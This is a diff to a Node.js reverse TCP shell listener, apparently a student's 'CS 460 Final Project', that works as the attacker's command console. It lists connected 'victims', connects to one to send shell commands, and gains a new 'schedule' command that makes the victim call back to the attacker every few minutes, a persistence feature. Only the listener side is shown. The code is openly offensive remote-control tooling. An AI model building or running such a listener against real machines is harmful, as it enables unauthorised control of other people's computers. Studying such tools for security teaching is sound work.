@@ -1,7 +1,17 @@
 /*
     nodejs
     reverse tcp shell listener
+
+    commands:
+  --------------------------------------------------------------------------------------------------
+    help
+    exit                    ---   quit listener
+    list                    ---   list victims
+    connect num             ---   connect to one victim
+                                  eg 'connect 0' will connect to the first victim in victim list
+    schedule n_minutes      ---   schedule attack, ask victim to try to connect to attacker every n_minutes
  */
+
 var net = require("net"); // load tcp library
 var readline = require("readline"); // load readline library
 var colors = require('colors'); // load color library
@@ -11,6 +21,7 @@ var current_socket = null;
 var prefix = "listener> ".yellow;
 var i;
 
+// project introduction
 console.log("CS 460 Final Project".gray.bold + "\n" +
             "Reverse TCP Shell".red + "," +" listener for Attacker \n".red +
             "ywang189 - Yiyi Wang ".green + "\n" +
@@ -43,7 +54,8 @@ rl.on('line', function(line) {
                     "exit                    ---   quit listener \n" +
                     "list                    ---   list victims \n" +
                     "connect num             ---   connect to one victim\n" +
-                    "                              eg 'connect 0' will connect to the first victim in victim list");
+                    "                              eg 'connect 0' will connect to the first victim in victim list\n" +
+                    "schedule n_minutes      ---   schedule attack, ask victim to try to connect to attacker every n_minutes");
         continueRepl();
     }
     else if (line === "list"){
@@ -69,6 +81,17 @@ rl.on('line', function(line) {
             }
         }
         continueRepl();
+    }
+    else if (line.startsWith("schedule ")){
+        try{
+            var minutes = parseInt(line.slice(9));
+            current_socket.write("schedule " + minutes); // send schedule minutes
+            rl.pause();
+        }
+        catch(e){
+            console.log("Invalid command: " + line);
+            continueRepl();
+        }
     }
     else{
         if(current_socket){
